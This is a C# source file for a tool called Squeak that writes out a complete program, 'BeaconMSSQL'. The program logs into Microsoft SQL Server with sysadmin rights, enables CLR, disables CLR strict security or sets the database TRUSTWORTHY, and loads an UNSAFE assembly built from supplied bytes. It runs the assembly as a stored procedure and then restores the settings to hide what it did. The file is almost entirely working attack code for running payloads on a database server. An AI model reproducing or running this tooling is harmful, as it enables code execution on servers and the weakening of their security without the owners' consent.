using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;
using System.Threading;
using System.IO;
using System.Windows;

namespace Squeak
{
    class clsCode
    {
        public string getexecode(string server, string port, string db, string username, string password, string dllhash, string assembly, string winauth)
        {

            //Code for the standalone exe that is going to be generated
            string code = @"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;
using System.Threading;
using System.Text.RegularExpressions;

namespace BeaconMSSQL
{
    class Program
    {


        static void Main(string[] args)
        {
            if(args.Length > 1)
            {
                Console.WriteLine(""Usage: \n Connectivity check: BeaconMSSQL.exe <server> <port> <db name> <username> <password>\n Run a query: BeaconMSSQL.exe <server> <port> <db name> <username> <password> <query>"");
                Environment.Exit(0);
            }

             int sleep = 5000;
            string server = ""[SERVER]"";
            string port = ""[PORT]"";
            string db = ""[DATABASE]"";
            string username = ""[USERNAME]"";
            string pw = ""[PASSWORD]"";
            string query = ""DLL"";
            bool winauth = false;
            try
            {
                string windowsauth = ""[WINAUTH]"";
                if (windowsauth.ToUpper() == ""TRUE"")
                {
                    winauth = true;
                }
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }

            Console.WriteLine(""Running with settings:\n==========\nServer: "" + server + ""\nPort: "" + port + ""\nDatabase: "" + db + ""\nUser: "" + username + ""\n==========""); 

            //Sha512 hash of the DLL for the sp_add_trusted_assembly command
            string dll_hash = ""[DLLHASH]"";
			
            SqlConnection con = new SqlConnection();
            try
            {
                 con = testconnection(server, db, username, pw, port, winauth);
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }
            if(!string.IsNullOrEmpty(query))
            {
               
               

                if (query.ToUpper() == ""DLL"")
                {

                    //Get the SQL server version
                    int sqlversion = 0;
                    List<List<string>> sqlversionquery = runquery(con, ""select @@version"");
                    string version = sqlversionquery[0][0];
                    string[] numbersinstring = Regex.Split(version, @""\D+"");
                    sqlversion = Convert.ToInt32(numbersinstring[1]);

 //Check for DBA
                    Console.WriteLine(""Checking for DBA Privs"") ;
                    List<List<string>> isdba = runquery(con, ""SELECT is_srvrolemember('sysadmin')"");
                    int dba = Convert.ToInt32(isdba[0][0]);
            if (dba == 0)
            {
                Console.WriteLine(""You don't have DBA privs, exiting"");
                Environment.Exit(0);
            }
            Console.WriteLine(""Got DBA Privs!"") ;

            //Check whether advanced options is on
            Console.WriteLine(""Checking whether Advanced Options are already on."") ;
            List<List<string>> advancedoptions = runquery(con, ""sp_configure 'show advanced options'"");
                    int advancedsetting = Convert.ToInt32(advancedoptions[0][3]);
                    if(advancedsetting == 0)
                    {
                        Console.WriteLine(""Enabling advanced options"");
                        runquery(con, ""sp_configure 'show advanced options',1;RECONFIGURE"");
                    }
                    else
                    {
                        Console.WriteLine(""Advanced options already shown"");
                    }

                

                    int clrsetting = 1;
                    int enableclr = 1;
                    //Check whether CLR strict is on

                    if(sqlversion < 2017)
{
    Console.WriteLine(""SQL Server is lower than 2017."");
   
}
                     //Enable CLR
                Console.WriteLine(""Checking CLR status"") ;
                        List<List<string>> enableclrquery = runquery(con, ""sp_configure 'clr enabled'"");
                        enableclr = Convert.ToInt32(enableclrquery[0][3]);
                        if (enableclr == 0)
                        {
                            Console.WriteLine(""Enabling CLR"");
                            runquery(con, ""sp_configure 'clr enabled',1;RECONFIGURE"");
                        }
                        else
                        {
                            Console.WriteLine(""CLR already enabled"");
                        }
                    if (sqlversion >= 2017)
                    {
                        Console.WriteLine(""SQL Server is 2017 or above."");
                        Console.WriteLine(""Checking CLR security"") ;
                        List<List<string>> clrstrict = runquery(con, ""sp_configure 'clr strict security'"");
                        clrsetting = Convert.ToInt32(clrstrict[0][3]);
                        if (clrsetting == 1)
                        {
                            Console.WriteLine(""Disabling CLR security"");
                            runquery(con, ""sp_configure 'clr strict security',0;RECONFIGURE"");
                        }
                        else
                        {
                            Console.WriteLine(""CLR security already disabled"");
                        }
                    }
                    
                    
                    
                    

                    //Clear up any old functions and make the new one.
                    Console.WriteLine(""Dropping any existing assemblies and procedures"") ;
                    runquery(con, ""DROP PROCEDURE debugrun"");
                    runquery(con, ""DROP ASSEMBLY debug"");

                    string trustworthy = """";
                    //Decision tree here to either use sp_add_trusted_assembly if > 2017 or set trustworthy if not
                    if (sqlversion >= 2017)
                    {
                        Console.WriteLine(""SQL version is 2017 or greater, using sp_add_trusted_assembly"");
                        runquery(con, ""sp_add_trusted_assembly @hash="" + dll_hash);
                    }
                    else
                    {
                        Console.WriteLine(""SQL version is lower than 2017, checking whether trustworthy is enabled on the connected DB:"");
                        List<List<string>> trustworthquery = runquery(con, ""select is_trustworthy_on from sys.databases where name = '"" + db + ""'"");
                        trustworthy = trustworthquery[0][0];
                        if (trustworthy == ""0"" || trustworthy.ToUpper() == ""FALSE"")
                        {
                             Console.WriteLine(""Setting trustworth for "" + db);
                            runquery(con, ""ALTER DATABASE "" + db + "" SET TRUSTWORTHY ON;"");
                        }
                    }
                    Console.WriteLine(""Creating the assembly"") ;
					runquery(con, ""CREATE ASSEMBLY debug from "" + ""[ASSEMBLY]"" + "" WITH PERMISSION_SET = UNSAFE"");
                    Console.WriteLine(""Creating the stored procedure"") ;
                    runquery(con, ""CREATE PROCEDURE debugrun AS EXTERNAL NAME debug.StoredProcedures.runner"");

                    //Run it
                    Console.WriteLine(""Running the stored procedure."") ;
                    runquery(con, ""debugrun"");

                    Console.WriteLine(""Sleeping before cleanup for: "" + sleep / 1000);
                    Thread.Sleep(sleep);

                    //Cleanup
                    Console.WriteLine(""\nCleanup\n======="");
                    if (sqlversion >= 2017)
                    {
                        Console.WriteLine(""Dropping trusted assembly hash."");
                        runquery(con, ""sp_drop_trusted_assembly @hash="" + dll_hash);
                        if (clrsetting == 1)
                        {
                            runquery(con, ""sp_configure 'clr strict security',1;RECONFIGURE"");
                        }
                    }
                    else
                    {
                        if (trustworthy == ""0"" || trustworthy.ToUpper() == ""FALSE"")
                        {
                            Console.WriteLine(""Turning trustworthy back off for "" + db);
                            runquery(con, ""ALTER DATABASE "" + db + "" SET TRUSTWORTHY OFF;"");
                        }
                       
                    }
                    if (enableclr == 0)
                        {
                            Console.WriteLine(""Disabling CLR again"");
                            runquery(con, ""sp_configure 'clr enabled',0;RECONFIGURE"");
                        }
                    Console.WriteLine(""Dropping procedure and assembly"");
                    runquery(con, ""DROP PROCEDURE debugrun"");
                    runquery(con, ""DROP ASSEMBLY debug"");

                   
                    if (advancedsetting == 0)
                    {
                        Console.WriteLine(""Disabling advanced options again"");
                        runquery(con, ""sp_configure 'show advanced options',0;RECONFIGURE"");
                    }
                    

                    Console.WriteLine(""Cleaned up... all done."") ;
                }
                

                else
                {
                    runquery(con, query);
                }
            }
        }

        public static SqlConnection testconnection(string server, string db, string username, string password, string port, bool winauth)
        {
            string connetionString = null;
            SqlConnection cnn;
              if (winauth)
            {
                connetionString = string.Format(""Data Source={0},{4};Initial Catalog={1};Integrated Security=True;"", server, db, username, password, port);
            }
            else
            {
                connetionString = string.Format(""Data Source={0},{4};Initial Catalog={1};User ID={2};Password={3}"", server, db, username, password, port);
            }
            cnn = new SqlConnection(connetionString);
            try
            {
                cnn.Open();
                Console.WriteLine(""Connection Open ! "");
                cnn.Close();
            }
            catch(Exception e)
            {
                Console.WriteLine(""Couldn't open connection: "" + e.Message);
            }
            return cnn;
        }

        public static List<List<string>> runquery(SqlConnection con, string query)
        {
            SqlCommand cmd = new SqlCommand();
            List<List<string>> myData = new List<List<string>>();

            cmd.CommandText = query;
            cmd.CommandType = System.Data.CommandType.Text;
            cmd.Connection = con;

            con.Open();
            try
            {
                using (SqlDataReader reader = cmd.ExecuteReader())
                {
                     //create list of list
                    int fieldN = reader.FieldCount; //i assume every row in the reader has the same number of field of the first row
                                                     //Cannot get number of rows in a DataReader so i fill a list
                    while (reader.Read())
                    {
                        //create list for the row
                        List<string> myRow = new List<string>();
                        myData.Add(myRow);//add the row to the list of rows
                        for (int i = 0; i < fieldN; i++)
                        {
                            myRow.Add(reader[i].ToString());//fill the row with field data
                        }
                    }

                    string[,] arrValues = new string[myData.Count, fieldN]; //create the array for the print class

                    //go through the list and convert to an array
                    //this could probably be improved 
                    for (int i = 0; i < myData.Count; i++)
                    {
                        List<string> myRow = myData[i];//get the list for the row
                        for (int j = 0; j < fieldN; j++)
                        {
                            arrValues[i, j] = myRow[j]; //read the field
                        }
                    }
                    ArrayPrinter.PrintToConsole(arrValues);
                }
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }
            // Data is accessible through the DataReader object here.

            con.Close();
            return myData;
        }
    }
    class ArrayPrinter
    {
        #region Declarations

        static bool isLeftAligned = false;
        const string cellLeftTop = ""┌"";
        const string cellRightTop = ""┐"";
        const string cellLeftBottom = ""└"";
        const string cellRightBottom = ""┘"";
        const string cellHorizontalJointTop = ""┬"";
        const string cellHorizontalJointbottom = ""┴"";
        const string cellVerticalJointLeft = ""├"";
        const string cellTJoint = ""┼"";
        const string cellVerticalJointRight = ""┤"";
        const string cellHorizontalLine = ""─"";
        const string cellVerticalLine = ""│"";

        #endregion

        #region Private Methods

        private static int GetMaxCellWidth(string[,] arrValues)
        {
            int maxWidth = 1;

            for (int i = 0; i < arrValues.GetLength(0); i++)
            {
                for (int j = 0; j < arrValues.GetLength(1); j++)
                {
                    int length = arrValues[i, j].Length;
                    if (length > maxWidth)
                    {
                        maxWidth = length;
                    }
                }
            }

            return maxWidth;
        }

        private static string GetDataInTableFormat(string[,] arrValues)
        {
            string formattedString = string.Empty;

            if (arrValues == null)
                return formattedString;

            int dimension1Length = arrValues.GetLength(0);
            int dimension2Length = arrValues.GetLength(1);

            int maxCellWidth = GetMaxCellWidth(arrValues);
            int indentLength = System.Math.Abs((dimension2Length * maxCellWidth) + (dimension2Length - 1));
            //printing top line;
            formattedString = string.Format(""{0}{1}{2}{3}"", cellLeftTop, Indent(indentLength), cellRightTop, System.Environment.NewLine);

            for (int i = 0; i < dimension1Length; i++)
            {
                string lineWithValues = cellVerticalLine;
                string line = cellVerticalJointLeft;
                for (int j = 0; j < dimension2Length; j++)
                {
                    string value = (isLeftAligned) ? arrValues[i, j].PadRight(maxCellWidth, ' ') : arrValues[i, j].PadLeft(maxCellWidth, ' ');
                    lineWithValues += string.Format(""{0}{1}"", value, cellVerticalLine);
                    line += Indent(maxCellWidth);
                    if (j < (dimension2Length - 1))
                    {
                        line += cellTJoint;
                    }
                }
                line += cellVerticalJointRight;
                formattedString += string.Format(""{0}{1}"", lineWithValues, System.Environment.NewLine);
                if (i < (dimension1Length - 1))
                {
                    formattedString += string.Format(""{0}{1}"", line, System.Environment.NewLine);
                }
            }

            //printing bottom line
            formattedString += string.Format(""{0}{1}{2}{3}"", cellLeftBottom, Indent(indentLength), cellRightBottom, System.Environment.NewLine);
            return formattedString;
        }

        private static string Indent(int count)
        {
            return string.Empty.PadLeft(count, '─');
        }

        #endregion

        #region Public Methods

 

        public static void PrintToConsole(string[,] arrValues)
        {
            if (arrValues == null || arrValues.Length < 1)
                return;

            Console.WriteLine(GetDataInTableFormat(arrValues));
        }

        #endregion
    }
}
";

            //Replace
            //[ASSEMBLY] = the bytes of clrpoc
            //[DLLHASH] = sha512 hash of the dll
            //[SERVER]
            //[PORT]
            //[DATABASE]
            //[USERNAME]
            //[PASSWORD]
            try
            {
                code = code.Replace("[ASSEMBLY]", assembly);
                code = code.Replace("[DLLHASH]", dllhash);
                code = code.Replace("[SERVER]", server);
                code = code.Replace("[PORT]", port);
                code = code.Replace("[DATABASE]", db);
                code = code.Replace("[USERNAME]", username);
                code = code.Replace("[PASSWORD]", password);
                code = code.Replace("[WINAUTH]", winauth);
            }
            catch(Exception ex)
            {
                MessageBox.Show("Couldn't perform code replacements, did you edit the code?");
            }

            return code;

        }

        public string getdllcode(string hex)
        {
            string dllcode = "";
            try
            {
                dllcode = File.ReadAllText("clrcode.cs");
                dllcode = dllcode.Replace("[HEX]", hex);
            }
            catch(Exception e)
            {
                MessageBox.Show("Could not read CLR code file. Make sure that clrcode.cs exists in the working directory of Squeak.exe");
            }

            return dllcode;
        }
    }
}
